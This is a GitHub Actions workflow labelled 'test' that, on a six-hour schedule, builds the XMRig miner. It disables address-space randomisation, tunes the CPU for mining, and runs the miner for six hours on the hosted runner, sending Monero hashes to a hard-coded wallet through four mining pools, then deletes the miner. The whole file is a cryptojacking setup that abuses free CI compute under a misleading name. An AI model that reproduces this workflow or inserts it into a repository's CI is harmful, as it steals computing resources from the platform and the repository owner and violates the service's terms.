name: test

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  mine:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    
    steps:
      - name: System Optimization
        run: |
          sudo sysctl -w vm.nr_hugepages=1280
          sudo sysctl -w kernel.randomize_va_space=0
          sudo sysctl -w vm.swappiness=1
          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
          
      - name: Install Dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git cpulimit
          
      - name: Build XMRig
        run: |
          git clone https://github.com/xmrig/xmrig.git
          cd xmrig
          mkdir build && cd build
          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
          make -j$(nproc)
          
      - name: Advanced Configuration
        run: |
          cd xmrig/build
          cat > config.json <<EOF
          {
            "api": {
              "id": null,
              "worker-id": "gh-runner"
            },
            "autosave": true,
            "background": false,
            "colors": true,
            "cpu": {
              "enabled": true,
              "huge-pages": true,
              "huge-pages-jit": true,
              "hw-aes": true,
              "priority": 5,
              "memory-pool": true,
              "yield": false,
              "max-threads-hint": 100,
              "asm": "auto",
              "argon2-impl": "auto",
              "rx": [0, 1, 2, 3, 4]
            },
            "opencl": false,
            "cuda": false,
            "donate-level": 1,
            "donate-over-proxy": 1,
            "log-file": null,
            "pools": [
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "xmr.2miners.com:2222",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "x",
                "rig-id": "gh-primary",
                "keepalive": true,
                "enabled": true,
                "tls": false,
                "tls-fingerprint": null,
                "daemon": false,
                "socks5": null,
                "self-select": null,
                "submit-to-origin": false
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.minexmr.com:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "x",
                "rig-id": "gh-backup1",
                "keepalive": true,
                "enabled": true,
                "tls": true,
                "tls-fingerprint": null,
                "daemon": false
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "pool.hashvault.pro:443",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "x",
                "rig-id": "gh-backup2",
                "keepalive": true,
                "enabled": true,
                "tls": true,
                "tls-fingerprint": null,
                "daemon": false
              },
              {
                "algo": "rx/0",
                "coin": "monero",
                "url": "xmr-eu1.nanopool.org:14433",
                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                "pass": "x",
                "rig-id": "gh-backup3",
                "keepalive": true,
                "enabled": true,
                "tls": true,
                "tls-fingerprint": null,
                "daemon": false
              }
            ],
            "print-time": 60,
            "health-print-time": 60,
            "dmi": true,
            "retries": 10,
            "retry-pause": 5,
            "syslog": false,
            "tls": {
              "enabled": false,
              "protocols": null,
              "cert": null,
              "cert_key": null,
              "ciphers": null,
              "ciphersuites": null,
              "dhparam": null
            },
            "user-agent": null,
            "verbose": 0,
            "watch": true,
            "pause-on-battery": false,
            "pause-on-active": false
          }
          EOF
          
      - name: CPU Governor Performance
        run: |
          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
          
      - name: Start Mining Maximum Performance
        run: |
          cd xmrig/build
          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 --threads=5 || true
          
      - name: Cleanup
        if: always()
        run: |
          sudo pkill -9 xmrig || true
          rm -rf xmrig
